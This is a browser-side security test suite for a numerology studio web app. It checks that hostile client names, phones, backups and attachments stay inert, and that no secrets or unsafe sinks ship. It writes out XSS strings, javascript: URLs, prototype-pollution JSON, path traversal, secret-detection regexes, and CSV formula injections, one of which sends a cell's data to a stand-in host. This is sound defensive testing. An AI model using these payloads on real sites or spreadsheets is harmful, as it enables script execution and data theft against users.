// @vitest-environment jsdom
/*
 * Attacks on the browser side: hostile text, forged files, tampered storage and
 * the things that must never ship. Each test asserts the SECURE behaviour.
 *
 * Fixed on 2026-10-07 (migration 20261007120000_security_fixes.sql and the app): every weakness this file
 * found now runs as a plain `it` that guards its fix; the comment above each test says what it was.
 *
 * `it.fails(...)` marks a real weakness found by the audit: the secure
 * behaviour does not hold today, so the test is expected to fail. When the fix
 * lands the test starts passing, Vitest reports that, and `.fails` must be
 * dropped so the test keeps guarding the fix. The fix is in the VULN comment.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { render, screen, fireEvent, cleanup, within, waitFor, configure } from "@testing-library/react";
import { readFileSync, readdirSync, statSync } from "node:fs";
import { dirname, join, relative, sep } from "node:path";
import { fileURLToPath } from "node:url";
import App from "../App.jsx";
import { AccountProvider } from "../account/AccountContext.jsx";
import { ToastProvider } from "../studio/Toasts.jsx";
import { labService } from "../lab/labAccount.js";
import { SUPABASE_PUBLISHABLE_KEY } from "../account/config.js";
import WorkspaceApp from "../workspace/WorkspaceApp.jsx";
import { ContentContext } from "../workspace/content.js";
import { saveFile, saveJson } from "../workspace/files.js";
import { createStore } from "../data/store.js";
import { memoryBackend } from "../data/memoryBackend.js";
import { validateAttachment } from "../data/validation.js";
import { whatsappLink, greetingLink } from "../studio/today.js";

// The whole App renders in these tests and this suite gates every deploy: be generous for a slow build machine.
configure({ asyncUtilTimeout: 5000 });
vi.setConfig({ testTimeout: 20000 });

// ---------- helpers ----------

// a string, not a URL object: under jsdom the global URL is jsdom's, which node:url refuses
const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
const SKIPPED_DIRS = new Set(["node_modules", "dist", "coverage", ".git", ".vercel", ".claude", "__tests__"]);

/** Every file under `dir` that `keep` accepts; test folders and build output are left out unless `withTests`. */
function walk(dir, keep, withTests = false) {
  const found = [];
  for (const name of readdirSync(dir)) {
    const full = join(dir, name);
    if (SKIPPED_DIRS.has(name) && !(withTests && name === "__tests__")) continue;
    if (statSync(full).isDirectory()) found.push(...walk(full, keep, withTests));
    else if (keep(full)) found.push(full);
  }
  return found;
}
const isCode = (f) => /\.(jsx?|mjs|ts|tsx)$/.test(f);
const isText = (f) => /\.(jsx?|mjs|ts|tsx|json|md|html|css|sql|txt)$/.test(f) && !f.endsWith("package-lock.json");
const shown = (f) => relative(ROOT, f).split(sep).join("/");
const read = (f) => readFileSync(f, "utf8");
const BROWSER_CODE = () => walk(join(ROOT, "src"), isCode);

const BOM = String.fromCodePoint(0xfeff);
const RLO = String.fromCodePoint(0x202e); // RIGHT-TO-LEFT OVERRIDE: makes "gpj.exe" look like "exe.jpg"
const ZWSP = String.fromCodePoint(0x200b);

/** What a person can read on the page: its text without the <style> and <script> bodies. */
function visibleText() {
  const copy = document.body.cloneNode(true);
  copy.querySelectorAll("style,script").forEach((node) => node.remove());
  return copy.textContent;
}

/** What `readAsText` returns for a Blob. */
const readBlob = (blob) =>
  new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(reader.result);
    reader.onerror = () => reject(reader.error);
    reader.readAsText(blob);
  });

/** A minimal RFC 4180 reader: quoted cells may hold commas, doubled quotes and line breaks. */
function parseCsv(raw) {
  const text = raw.startsWith(BOM) ? raw.slice(1) : raw;
  const rows = [];
  let row = [];
  let cell = "";
  let quoted = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (quoted) {
      if (ch !== '"') cell += ch;
      else if (text[i + 1] === '"') (cell += '"'), i++;
      else quoted = false;
    } else if (ch === '"') quoted = true;
    else if (ch === ",") (row.push(cell), (cell = ""));
    else if (ch === "\n") (row.push(cell), rows.push(row), (row = []), (cell = ""));
    else cell += ch;
  }
  if (cell !== "" || row.length) (row.push(cell), rows.push(row));
  return rows;
}

/** jsdom has no object URLs or downloads: capture what the page would have saved. */
function captureDownloads() {
  const blobs = [];
  const anchors = [];
  URL.createObjectURL = (b) => (blobs.push(b), "blob:test");
  URL.revokeObjectURL = () => {};
  vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(function () {
    anchors.push({ download: this.download, target: this.target, href: this.href });
  });
  return { blobs, anchors };
}

/** A 2D context that accepts every drawing call: the background canvases draw stars the tests do not look at. */
const canvas2d = new Proxy({}, { get: (store, key) => (key in store ? store[key] : () => canvas2d), set: (store, key, value) => ((store[key] = value), true) });

beforeEach(() => {
  delete window.__pwned;
  vi.stubGlobal("matchMedia", vi.fn((q) => ({
    matches: !q.includes("reduce") && 1300 >= Number((q.match(/min-width: ([0-9]+)px/) || [])[1] || 0),
    addEventListener() {},
    removeEventListener() {},
  })));
  HTMLCanvasElement.prototype.getContext = () => canvas2d;
  window.IntersectionObserver = class {
    constructor(callback) {
      this.callback = callback;
    }
    observe() {
      this.callback([{ isIntersecting: true }]);
    }
    disconnect() {}
  };
  window.scrollTo = () => {};
});

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
  delete URL.createObjectURL;
  // revokeObjectURL stays: the page revokes a download's URL a second later, possibly during a later test
  localStorage.clear();
});

/** The Studio as the signed-in lab admin (all in memory, no network). */
function studio() {
  localStorage.setItem("numerology_owner_mode", "owner");
  render(
    <AccountProvider active loadService={async () => labService()}>
      <ToastProvider>
        <App />
      </ToastProvider>
    </AccountProvider>,
  );
}
/** The public customer page. Reaching the accounts service from it would be a bug, so it throws. */
function customerPage() {
  localStorage.setItem("numerology_owner_mode", "customer");
  render(
    <AccountProvider loadService={async () => Promise.reject(new Error("the customer page must not reach the accounts service"))}>
      <ToastProvider>
        <App />
      </ToastProvider>
    </AccountProvider>,
  );
}
const tool = (name) => fireEvent.click(within(screen.getByRole("navigation", { name: "כלי הסטודיו" })).getByRole("button", { name }));
const SIGNED_IN = { timeout: 5000 };

// ---------- 1. XSS: hostile text stays text ----------

const CONTENT = {
  D: Object.fromEntries([1, 2, 3, 4, 5, 6, 7, 8, 9].map((n) => [n, { t: `ארכיטיפ ${n}`, te: `Archetype ${n}` }])),
  MASTER: {},
  KARMA: {},
  YEAR_ENERGY: {},
  LP_COMPAT: {},
  getCompat: () => null,
  exportReport: vi.fn(),
};
const NOW = new Date(2026, 9, 5, 12);
const INJECTORS = "[onerror],[onload],[onclick],script,iframe,object,embed,link[rel=import]";

describe("XSS: hostile text is shown as text and never becomes markup", () => {
  it("a client whose name, notes and tag are HTML stays a plain-text row and a plain-text file", async () => {
    const hostileName = `<img src=x onerror="window.__pwned='name'">`;
    const store = createStore(memoryBackend(), { now: () => NOW });
    await store.clients.create({
      fullName: hostileName,
      birthDate: "1990-08-15",
      notes: `<script>window.__pwned='notes'</script><svg onload="window.__pwned='svg'">`,
      tags: [`"><svg onload=alert(1)>`],
    });
    const { container } = render(
      <ContentContext.Provider value={CONTENT}>
        <WorkspaceApp he dk store={store} now={() => NOW} />
      </ContentContext.Provider>,
    );
    fireEvent.click(await screen.findByRole("button", { name: /onerror/ }));
    expect(await screen.findByRole("heading", { name: hostileName })).toBeTruthy();
    expect(container.querySelectorAll(INJECTORS).length).toBe(0);
    expect(document.querySelectorAll("img[src='x']").length).toBe(0);
    expect(window.__pwned).toBeUndefined();
  });

  const LEADS = [
    { name: "<img src=x onerror=\"window.__pwned='lead'\">", phone: "javascript:alert(1)", lp: 1, nv: 2, su: 3, py: 4, kd: "13", date: "5.10.2026", ts: 4 },
    { name: "Dana", phone: "+972 54-764-0203", lp: 5, nv: 6, su: 7, py: 8, kd: "", date: "5.10.2026", ts: 3 },
    { name: "Eve", phone: "0547640203\"><script>window.__pwned='phone'</script>", lp: 9, nv: 1, su: 2, py: 3, kd: "", date: "5.10.2026", ts: 2 },
  ];

  it("hostile lead names and phones render as text, and every link is wa.me with digits only", async () => {
    localStorage.setItem("numerology_leads_v1", JSON.stringify(LEADS));
    studio();
    await screen.findByText("לקוחות אחרונים", {}, SIGNED_IN);
    tool("לידים");
    const heading = await screen.findByRole("heading", { name: "לידים" });
    const panel = heading.closest(".st-tool-wide");
    expect(panel).toBeTruthy();
    expect(panel.textContent).toContain("javascript:alert(1)"); // shown as text, nothing more
    expect(panel.querySelectorAll(INJECTORS).length).toBe(0);
    const hrefs = [...panel.querySelectorAll("a[href]")].map((a) => a.getAttribute("href"));
    expect(hrefs.length).toBeGreaterThan(0);
    for (const href of hrefs) expect(href).toMatch(/^https:\/\/wa\.me\/\d{9,15}$/);
    expect(window.__pwned).toBeUndefined();
  });
});

describe("links built from a client's or lead's phone number", () => {
  const HOSTILE_PHONES = [
    "javascript:alert(1)",
    "0547640203\"><script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD4=",
    "//evil.example/0547640203",
    "054-764-0203/../../x",
    "0547640203?text=pwned&x=1#frag",
    "",
    null,
    undefined,
    12345,
    "+972 (0) 54 764 0203",
  ];

  it("whatsappLink returns null or https://wa.me/<digits>, whatever the phone holds", () => {
    for (const phone of HOSTILE_PHONES) {
      const link = whatsappLink(phone);
      if (link !== null) expect(link).toMatch(/^https:\/\/wa\.me\/\d{9,15}$/);
    }
    expect(whatsappLink("javascript:alert(1)")).toBeNull();
    expect(whatsappLink("+972 (0) 54 764 0203")).toBe("https://wa.me/972547640203");
  });

  it("greetingLink keeps the text inside one ?text= parameter, with no way to add a parameter or a fragment", () => {
    const text = `Hi & bye #1 "quoted" <b>x</b> ?a=b ${String.fromCharCode(0xd800)}`;
    const link = greetingLink("0547640203", text);
    const url = new URL(link);
    expect(url.origin + url.pathname).toBe("https://wa.me/972547640203");
    expect([...url.searchParams.keys()]).toEqual(["text"]);
    expect(url.hash).toBe("");
    expect(url.searchParams.get("text")).toContain("Hi & bye #1");
  });
});

// ---------- 2. Attachments and backups ----------

describe("attachments are downloaded, never rendered", () => {
  it("hands every attachment to the browser as an octet-stream download, opening no tab", () => {
    const { blobs, anchors } = captureDownloads();
    const open = vi.spyOn(window, "open").mockImplementation(() => null);
    for (const [name, html] of [["page.html", "<script>alert(1)</script>"], ["pic.svg", "<svg onload=alert(1)/>"], ["x.xhtml", "<html/>"]]) {
      saveFile(name, new TextEncoder().encode(html));
    }
    expect(blobs.map((b) => b.type)).toEqual(["application/octet-stream", "application/octet-stream", "application/octet-stream"]);
    expect(anchors.map((a) => a.download)).toEqual(["page.html", "pic.svg", "x.xhtml"]);
    expect(anchors.every((a) => a.target === "")).toBe(true);
    expect(open).not.toHaveBeenCalled();
  });

  it("saves a backup as JSON, never as a page", () => {
    const { blobs } = captureDownloads();
    saveJson("b.json", { clients: [] });
    expect(blobs[0].type).toBe("application/json");
  });

  it("strips the path and every text-direction or invisible trick from an attachment's name", () => {
    const meta = validateAttachment({ clientId: "c1", name: `C:\\fakepath\\..\\..\\invoice${RLO}gpj${ZWSP}.exe`, type: "text/html", size: 3 });
    expect(meta.name).toBe("invoicegpj.exe");
    expect(validateAttachment({ clientId: "c1", name: "../../etc/passwd", type: "", size: 1 }).name).toBe("passwd");
    expect(() => validateAttachment({ clientId: "c1", name: `${RLO}${ZWSP}`, type: "", size: 1 })).toThrow();
  });
});

describe("a forged backup cannot smuggle anything in", () => {
  const STAMP = "2026-01-01T00:00:00.000Z";
  const backupOf = (clients) => ({ format: "numerology-workspace-backup", version: 1, exportedAt: STAMP, clients, readings: [], attachments: [] });

  it("a prototype-looking id and extra fields (__proto__, isAdmin) are stored as plain data and pollute nothing", async () => {
    const store = createStore(memoryBackend(), { now: () => NOW });
    // JSON.parse makes "__proto__" an own property, as a real file would
    const forged = JSON.parse(
      `{"format":"numerology-workspace-backup","version":1,"exportedAt":"${STAMP}","readings":[],"attachments":[],` +
        `"clients":[{"id":"__proto__","fullName":"Mallory","createdAt":"${STAMP}","updatedAt":"${STAMP}",` +
        `"__proto__":{"polluted":"yes"},"isAdmin":true,"role":"admin","constructor":{"prototype":{"polluted":"yes"}}}]}`,
    );
    const counts = await store.importAll(forged);
    expect(counts.clients).toBe(1);
    expect({}.polluted).toBeUndefined();
    expect(Object.prototype.polluted).toBeUndefined();
    const saved = await store.clients.get("__proto__");
    expect(saved.fullName).toBe("Mallory");
    expect(saved).not.toHaveProperty("isAdmin");
    expect(saved).not.toHaveProperty("role");
  });

  it("ids that could name a path or hold markup are refused before anything is written", async () => {
    for (const id of ["../../other-user/file", "a/b", "a b", "<script>", "x\\y", "", "a".repeat(101)]) {
      const store = createStore(memoryBackend(), { now: () => NOW });
      await expect(store.importAll(backupOf([{ id, fullName: "X", createdAt: STAMP, updatedAt: STAMP }]))).rejects.toThrow();
      expect(await store.clients.list({ includeArchived: true })).toEqual([]);
    }
  });

  it("a forged phone or e-mail that is a javascript: link is refused", async () => {
    for (const bad of [{ phone: "javascript:alert(1)" }, { email: "javascript:alert(1)" }, { phone: "9".repeat(26) }]) {
      const store = createStore(memoryBackend(), { now: () => NOW });
      const client = { id: "c1", fullName: "X", createdAt: STAMP, updatedAt: STAMP, ...bad };
      await expect(store.importAll(backupOf([client]))).rejects.toThrow();
    }
  });

  it("restoring never rewrites a client that is newer here, even from a copy dated in the far future", async () => {
    const store = createStore(memoryBackend(), { now: () => NOW });
    const mine = await store.clients.create({ fullName: "Mine", birthDate: "1990-08-15" });
    const future = "2999-01-01T00:00:00.000Z";
    await store.importAll(backupOf([{ id: mine.id, fullName: "Overwritten by attacker", createdAt: STAMP, updatedAt: future }]));
    expect((await store.clients.get(mine.id)).fullName).toBe("Mine");
  });
});

// ---------- 3. CSV export of the leads ----------

describe("leads CSV export", () => {
  const LEADS = [
    { name: "=HYPERLINK(\"https://evil.example/?c=\"&B2,\"click\")", phone: "+972 54-764-0203", lp: 1, nv: 2, su: 3, py: 4, kd: "13,14", date: "5.10.2026", ts: 4 },
    { name: "@SUM(1+1)*cmd|' /C calc'!A0", phone: "-2+3", lp: 5, nv: 6, su: 7, py: 8, kd: "", date: "5.10.2026", ts: 3 },
    { name: "plain \"quoted\", name\nsecond line", phone: "0501234567", lp: 9, nv: 1, su: 2, py: 3, kd: "", date: "5.10.2026", ts: 2 },
  ];

  async function exportedRows() {
    localStorage.setItem("numerology_leads_v1", JSON.stringify(LEADS));
    const { blobs } = captureDownloads();
    studio();
    await screen.findByText("לקוחות אחרונים", {}, SIGNED_IN);
    tool("לידים");
    fireEvent.click(await screen.findByRole("button", { name: "ייצוא CSV" }));
    await waitFor(() => expect(blobs.length).toBe(1));
    return parseCsv(await readBlob(blobs[0]));
  }

  it("quotes commas, double quotes and line breaks, so each lead stays one row of eight cells", async () => {
    const rows = await exportedRows();
    expect(rows.length).toBe(1 + LEADS.length);
    for (const row of rows) expect(row.length).toBe(8);
    expect(rows[3][0]).toBe(LEADS[2].name);
  });

  // FIXED after the 2026-10-07 audit; was (LOW, owner's own device today; MEDIUM once leads come from a server): src/App.jsx:1844.
  // Wrapping a cell in double quotes does not stop Excel or Sheets evaluating it: a name that
  // starts with = + - @ (or a tab or carriage return) runs as a formula when the owner opens leads.csv.
  // Fix: in exportCsv, neutralise before quoting:
  //   const cell = (v) => { const s = String(v ?? ""); return `"${(/^[=+\-@\t\r]/.test(s) ? "'" + s : s).replace(/"/g, '""')}"`; };
  //   and build the rows with rows.map(r => r.map(cell).join(",")).
  it("no exported cell starts with = + - @ tab or CR, which spreadsheets run as formulas", async () => {
    const rows = await exportedRows();
    for (const row of rows.slice(1)) for (const value of row) expect(value).not.toMatch(/^[=+\-@\t\r]/);
  });
});

// ---------- 4. Nothing is for sale ----------

describe("nothing is for sale on the site", () => {
  it("shows no shop, cart, prices or checkout, and forgets a cart a browser kept from before", async () => {
    localStorage.setItem("numerology_cart_v1", '{"full-map":2,"vip":1}');
    customerPage();
    await screen.findByTitle("דברו איתי בוואטסאפ", {}, SIGNED_IN); // the customer page is up
    expect(screen.queryByRole("button", { name: /^עגלה/ })).toBeNull();
    expect(visibleText()).not.toMatch(/לעגלה|סיום הזמנה|לרכישה|₪[0-9]/);
    expect(localStorage.getItem("numerology_cart_v1")).toBeNull();
  });
});

describe("lead capture gate", () => {
  /** A customer's reading up to the point where the phone number is asked for. */
  async function reachGate() {
    customerPage();
    const [name] = await screen.findAllByPlaceholderText("הכנס את שמך בעברית...");
    fireEvent.change(name, { target: { value: "דנה" } });
    fireEvent.click(screen.getAllByRole("button", { name: "המשך ←" })[0]);
    const born = await screen.findByPlaceholderText("dd.mm.yyyy");
    fireEvent.change(born, { target: { value: "15.08.1990" } });
    fireEvent.keyDown(born, { key: "Enter" });
    return screen.findByPlaceholderText("מספר וואטסאפ…", {}, SIGNED_IN);
  }
  const stored = () => JSON.parse(localStorage.getItem("numerology_leads_v1") || "[]");

  it("sends the visitor's details to the owner only through an encoded wa.me link opened with noopener", async () => {
    const open = vi.spyOn(window, "open").mockImplementation(() => null);
    const phone = await reachGate();
    // a value built to break out of the link never gets that far: the gate keeps phone-shaped values only
    fireEvent.change(phone, { target: { value: '0547640203&text=pwned#x"><b>' } });
    fireEvent.click(screen.getByRole("button", { name: "חשוף" }));
    expect(open).not.toHaveBeenCalled();
    expect(stored()).toEqual([]);
    fireEvent.change(phone, { target: { value: "+972 (54) 764-0203" } });
    fireEvent.click(screen.getByRole("button", { name: "חשוף" }));
    expect(open).toHaveBeenCalledTimes(1);
    const [href, target, features] = open.mock.calls[0];
    const url = new URL(href);
    expect(url.origin + url.pathname).toBe("https://wa.me/972547640203");
    expect([...url.searchParams.keys()]).toEqual(["text"]);
    expect(url.hash).toBe("");
    expect(url.searchParams.get("text")).toContain("+972 (54) 764-0203"); // carried as text, not as a second parameter
    expect(target).toBe("_blank");
    expect(features).toBe("noopener,noreferrer");
  });

  it("refuses a number with fewer than six digits and stores nothing", async () => {
    const open = vi.spyOn(window, "open").mockImplementation(() => null);
    const phone = await reachGate();
    fireEvent.change(phone, { target: { value: "12-34" } });
    fireEvent.click(screen.getByRole("button", { name: "חשוף" }));
    expect(open).not.toHaveBeenCalled();
    expect(stored()).toEqual([]);
  });

  // FIXED after the 2026-10-07 audit; was (LOW): src/App.jsx:1816-1818. The gate only counts digits (6 or more) and then stores the raw text,
  // with no character check and no length cap, although the workspace already has the right rule
  // (src/data/validation.js: /^[+]?[0-9()\- ]{3,}$/ and at most 25 characters). A formula or a megabyte of text
  // goes into leads, which the CSV export then writes out.
  // Fix: at the top of submit():
  //   const clean = phone.trim();
  //   if (!/^[+]?[0-9()\- ]{6,25}$/.test(clean)) return;   // and store `clean`
  it("a phone that is not digits, + ( ) - and spaces is refused at the gate", async () => {
    vi.spyOn(window, "open").mockImplementation(() => null);
    const phone = await reachGate();
    fireEvent.change(phone, { target: { value: "=cmd|' /C calc'!A0 123456" } });
    fireEvent.click(screen.getByRole("button", { name: "חשוף" }));
    for (const lead of stored()) expect(lead.phone).toMatch(/^[+]?[0-9()\- ]{6,25}$/);
    expect(stored()).toEqual([]);
  });
});

describe("contact details customers rely on", () => {
  const app = read(join(ROOT, "src", "App.jsx"));

  // FIXED after the 2026-10-07 audit; was (LOW): src/App.jsx:1142. The footer's "Email" link opens mailto:shani@example.com,
  // a reserved domain nobody owns, so a customer's message (and birth date) goes nowhere.
  // Fix: set BUSINESS_EMAIL to the real address, or remove the link until there is one.
  it("the contact e-mail is not the example.com placeholder", () => {
    expect(/BUSINESS_EMAIL\s*=\s*"[^"]*@example\.(com|org|net)"/.test(app)).toBe(false);
  });
});

// ---------- 5. What must never ship ----------

const SINKS = /dangerouslySetInnerHTML|\.innerHTML|outerHTML|insertAdjacentHTML|document\.write|\beval\(|new Function\(|\bsrcdoc\b|\bsrcDoc\b/;
const SECRETS = [
  ["Supabase secret key", /sb_secret_[A-Za-z0-9_-]{8,}/],
  ["JWT", /eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}/],
  ["private key block", /-----BEGIN [A-Z ]+-----/],
  ["AWS access key", /AKIA[0-9A-Z]{16}/],
  ["GitHub token", /gh[pousr]_[A-Za-z0-9]{30,}/],
  ["OpenAI or Anthropic key", /sk-[A-Za-z0-9_-]{20,}/],
  ["Stripe key", /[sr]k_live_[A-Za-z0-9]{10,}/],
];

describe("source hygiene", () => {
  it("scans real code: the scanners see the whole app and catch planted sinks and secrets", () => {
    const files = BROWSER_CODE().map(shown);
    expect(files.length).toBeGreaterThan(40);
    expect(files).toContain("src/App.jsx");
    expect(files).toContain("src/workspace/files.js");
    expect(files.some((f) => f.includes("__tests__"))).toBe(false);
    for (const sink of ["el.innerHTML = x", "<p dangerouslySetInnerHTML={{ __html: x }} />", "eval(code)", "new Function(code)", "document.write(x)", '<iframe srcdoc="x">']) {
      expect(SINKS.test(sink)).toBe(true);
    }
    // built at run time, so this file itself holds nothing secret-shaped
    const planted = [
      "sb_secret_" + "a".repeat(24),
      ["eyJ" + "a".repeat(12), "b".repeat(12), "c".repeat(12)].join("."),
      "-----BEGIN " + "RSA PRIVATE KEY" + "-----",
      "AKIA" + "A".repeat(16),
      "ghp_" + "a".repeat(36),
      "sk-" + "a".repeat(30),
      "sk_live_" + "a".repeat(20),
    ];
    for (const text of planted) expect(SECRETS.some(([, pattern]) => pattern.test(text))).toBe(true);
  });

  it("has no way to turn text into markup or code: no innerHTML, eval, document.write or srcdoc", () => {
    const offenders = BROWSER_CODE().filter((f) => SINKS.test(read(f))).map(shown);
    expect(offenders).toEqual([]);
  });

  it("opens every outside window and link with noopener", () => {
    const offenders = [];
    for (const file of BROWSER_CODE()) {
      read(file).split("\n").forEach((line, i) => {
        if (/window\.open\(/.test(line) && !/noopener/.test(line)) offenders.push(`${shown(file)}:${i + 1}`);
        if (/target="_blank"/.test(line) && !/noopener/.test(line)) offenders.push(`${shown(file)}:${i + 1}`);
      });
    }
    expect(offenders).toEqual([]);
  });

  it("leaves no console output in the shipped code, where client details could end up in a log", () => {
    const offenders = BROWSER_CODE().filter((f) => /console\.(log|info|debug|warn|error|trace)\(/.test(read(f))).map(shown);
    expect(offenders).toEqual([]);
  });

  it("holds no secret-shaped string anywhere in the repository (public on GitHub)", () => {
    const files = walk(ROOT, isText, true);
    expect(files.length).toBeGreaterThan(80); // tests, docs, supabase and config included
    const hits = [];
    for (const file of files) {
      const text = read(file);
      for (const [type, pattern] of SECRETS) if (pattern.test(text)) hits.push(`${type} in ${shown(file)}`);
    }
    expect(hits).toEqual([]);
  });

  it("keeps the service-role and secret keys out of the browser code", () => {
    const offenders = BROWSER_CODE().filter((f) => /service_role|sb_secret_/.test(read(f))).map(shown);
    expect(offenders).toEqual([]);
  });

  it("ships only the publishable Supabase key, and keeps every .env file out of git", () => {
    expect(SUPABASE_PUBLISHABLE_KEY.startsWith("sb_publishable_")).toBe(true);
    const ignored = read(join(ROOT, ".gitignore")).split("\n").map((l) => l.trim());
    expect(ignored).toContain(".env");
    expect(ignored).toContain(".env.*");
  });

  // FIXED after the 2026-10-07 audit; was (MEDIUM, supply chain and stale deploy path): package.json:10 and :18.
  // `serve` is a Railway leftover: nothing imports it, `npm audit --omit=dev` flags it (high, via compression),
  // and `npm start` would serve dist/ WITHOUT the CSP and security headers that only vercel.json sends.
  // Fix: npm uninstall serve, delete the "start" script, and update README.md (still a Railway guide).
  it("every production dependency is used by the app, and there is no start script serving dist without headers", () => {
    const pkg = JSON.parse(read(join(ROOT, "package.json")));
    const code = [...BROWSER_CODE(), join(ROOT, "vite.config.js")].map(read).join("\n");
    const unused = Object.keys(pkg.dependencies).filter((dep) => !new RegExp(`(from|import\\(|import|require\\()\\s*["']${dep}["'/]`).test(code));
    expect(unused).toEqual([]);
    expect(pkg.scripts.start).toBeUndefined();
  });
});
